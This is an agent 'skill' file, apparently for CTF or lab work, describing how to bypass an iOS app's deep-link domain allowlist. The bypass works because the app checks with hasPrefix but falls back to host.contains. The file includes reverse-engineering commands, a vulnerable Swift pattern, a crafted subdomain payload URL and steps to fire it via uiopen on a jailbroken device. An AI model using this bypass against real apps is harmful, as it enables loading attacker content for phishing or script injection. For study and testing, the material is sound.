---
name: ios-deeplink-domain-filter-bypass
description: "Use when an iOS app validates deep link URL parameters with inconsistent string-matching (hasPrefix on full URL vs contains on host) to enforce a domain allowlist; craft a URL that passes hasPrefix but loads an attacker-controlled domain in the WKWebView. Triggers - \"hasPrefix bypass\", \"domain filter\", \"CFBundleURLSchemes\", \"deeplink domain\", \"URL scheme filter\""
platform: [ios]
stack: [native]
category: deeplink
tier: B
related: []
---

# SKILL: iOS Deep Link Domain Filter Bypass via Inconsistent String Matching

## Applicability

- **Platforms:** iOS (IPA)
- **App types:** Native SwiftUI apps that register custom URL schemes (`CFBundleURLTypes`) and use deep links to load content in an embedded browser (WKWebView)
- **Use cases:** Bypassing domain allow-lists / URL filtering when the app uses inconsistent string-matching methods (e.g., `hasPrefix` on full URL vs `contains` on host) to validate deep link parameters

## NOT applicable to

- Android apps (use intent-based analysis instead)
- Apps that validate domains with exact match (`==`) on both host and full URL
- Apps with no custom URL scheme / deep link handling
- Universal Links (associated domains): these use a different validation path via Apple's CDN

## Trigger conditions

Apply this skill when you see:
1. A custom URL scheme registered in `Info.plist` (`CFBundleURLSchemes`)
2. A deep link handler method (e.g., `handleIncomingURL`, `onOpenURL`)
3. String literals for "approved" or "trusted" domains in the binary
4. The app loads URLs in a webview (WKWebView / SFSafariViewController)
5. The app handles deep-linked URLs with a domain allow-list ("approved" or "trusted" domains)

## Detection signals

### Static analysis

1. **Info.plist:** Look for `CFBundleURLTypes` → `CFBundleURLSchemes` to find the scheme
2. **Symbols:** `nm -gU <App>.debug.dylib | grep -iE "handleIncomingURL|onOpenURL|urlToLoad|url|host|scheme"`: find the handler and state properties
3. **Strings:** `strings -n 6 <App>.debug.dylib | grep -iE "http|url|trust|domain|approved|safe|host|scheme|open"`: find hardcoded domains and action names
4. **Disassembly:** `otool -tvV <App>.debug.dylib` and grep for:
   - `_$s10Foundation3URLV6schemeSSSgvg` (URL.scheme getter)
   - `_$s10Foundation3URLV4hostSSSgvg` (URL.host getter)
   - `_$s10Foundation3URLV14absoluteStringSSvg` (URL.absoluteString getter)
   - `_$sSS9hasPrefixySbSSF` (String.hasPrefix)
   - `_$sSy10FoundationE8containsySbqd__SyRd__lF` (String.contains)
   - `_$sSS2eeoiySbSS_SStFZ` (String.== operator)
   - `_$s10Foundation13URLComponentsV10queryItemsSayAA12URLQueryItemVGSgvg` (URLComponents.queryItems)
   - `_$s10Foundation12URLQueryItemV5valueSSSgvg` (URLQueryItem.value getter)
   - `_$sSTsE5first5where7ElementQzSgSbADKXE_tKF` (Sequence.first(where:))

### Key pattern to identify

The vulnerability exists when the validation uses TWO different string-matching methods:
- **Strict check:** `absoluteString.hasPrefix("https://approved.com")`: requires exact prefix
- **Loose fallback:** `host.contains("approved.com")`: allows any host containing the domain as substring

```swift
// Vulnerable pattern (pseudocode reconstructed from disasm):
func handleIncomingURL(_ url: URL) {
    guard url.scheme == "trustfall" else { return }
    guard url.host == "open" else { return }
    
    let components = URLComponents(url: url, resolvingAgainstBaseURL: false)
    let urlItem = components?.queryItems?.first(where: { $0.name == "url" })
    let targetURL = URL(string: urlItem?.value ?? "")
    
    if targetURL?.absoluteString.hasPrefix("https://approved.com") == true {
        // Trusted path: load directly, no flag
        urlToLoad = targetURL
    } else if targetURL?.host?.contains("approved.com") == true {
        // "Untrusted" but still loads: reveals flag + warning
        urlToLoad = targetURL
        showWarning = true
        secret = "<<value>>"  // sensitive value revealed here
    }
}
```

## Solution steps

1. **Extract the IPA** and read `Info.plist` for the URL scheme:
   ```bash
   unzip <app>.ipa -d /tmp/ipa_out
   plutil -p /tmp/ipa_out/Payload/<App>.app/Info.plist | grep -A5 CFBundleURL
   ```

2. **Extract symbols and strings** to find the handler, domains, and action:
   ```bash
   nm -gU /tmp/ipa_out/Payload/<App>.app/<App>.debug.dylib > symbols.txt
   strings -n 6 /tmp/ipa_out/Payload/<App>.app/<App>.debug.dylib > strings.txt
   grep -iE "handleIncoming|url|host|scheme|open|approved|domain|flag" symbols.txt
   grep -iE "http|\.com|\.io|trust|domain|approved|flag|open|url" strings.txt
   ```

3. **Disassemble the handler** to trace the validation logic:
   ```bash
   otool -tvV /tmp/ipa_out/Payload/<App>.app/<App>.debug.dylib > disasm.txt
   # Find the handler function
   grep -n "handleIncomingURL\|onOpenURL" disasm.txt
   # Find string comparisons
   grep -n "hasPrefix\|contains\|absoluteString\|4host\|6scheme" disasm.txt
   ```

4. **Identify the matching methods used:**
   - `hasPrefix` = strict prefix match (hard to bypass directly)
   - `contains` = loose substring match (easily bypassed)
   - `==` (SS2eeoiySbSS_SStFZ) = exact match

5. **Craft the deep link payload.** If `hasPrefix("https://approved.com")` is the strict check and `host.contains("approved.com")` is the loose fallback:
   ```
   scheme://action?url=https://evil.approved.com
   ```
   - The inner URL's `absoluteString` (`https://evil.approved.com`) does NOT have prefix `https://approved.com` → strict check fails
   - The inner URL's `host` (`evil.approved.com`) DOES contain `approved.com` → loose check passes

6. **Send the deep link to the device:**
   ```bash
   # On a jailbroken device with uiopen installed:
   sshpass -p <pass> ssh root@<phone_ip> "uiopen 'scheme://action?url=https://evil.approved.com'"
   ```

7. **Verify the flag appeared** via accessibility inspection:
   ```bash
   pymobiledevice3 developer accessibility list-items | grep -i "flag\|secret\|alert"
   ```

## Technical notes

- **`uiopen`** is available on jailbroken devices (palera1n rootless: `/var/jb/usr/bin/uiopen`). It opens a URL via SpringBoard's `openURL:` mechanism, triggering the app's custom scheme handler.
- **URL encoding:** If the target URL contains special characters (spaces, `&`, `=`), URL-encode the value of the `url` query parameter. For simple subdomain bypasses (`https://evil.approved.com`), no encoding is needed.
- **`contains` vs `hasSuffix`:** Some apps use `host.hasSuffix("approved.com")` instead of `contains`. In that case, `evil.approved.com` still works (suffix match), but `approved.com.evil.com` would not.
- **Multiple query params:** The handler uses `first(where: { $0.name == "url" })`: only the first `url` parameter is used. Additional params are ignored.
- **WKWebView loads the URL:** The bypassed URL is actually loaded in the browser. If the attacker controls the subdomain (`evil.approved.com`), they can serve arbitrary content (phishing, JS exploitation, etc.). The flag is revealed regardless of whether the URL is reachable.

## Validation

1. Kill the app and relaunch from clean state
2. Verify no flag in UI via `pymobiledevice3 developer accessibility list-items`
3. Send the crafted deep link via `uiopen`
4. Wait 2 seconds
5. Check accessibility items again: the value should appear (e.g., "Flag: <value>")
6. Optional: take a screenshot via `pymobiledevice3 developer screenshot <path>`

## Related techniques

- **iOS deep link parameter injection:** If the app passes query params from the deep link to internal functionality without sanitization, you can inject arbitrary values.
- **Universal Links abuse:** If the app has `AssociatedDomains` in entitlements, check `apple-app-site-association` for allowed paths and try to access restricted paths.
- **WKWebView JavaScript injection:** If the loaded URL is attacker-controlled, JS can access the webview's document and potentially bridge to native code via `WKScriptMessageHandler`.
- **URL scheme hijacking:** Other apps can register the same URL scheme: the last-installed app wins. This can be used for phishing if the victim opens a link expecting your app.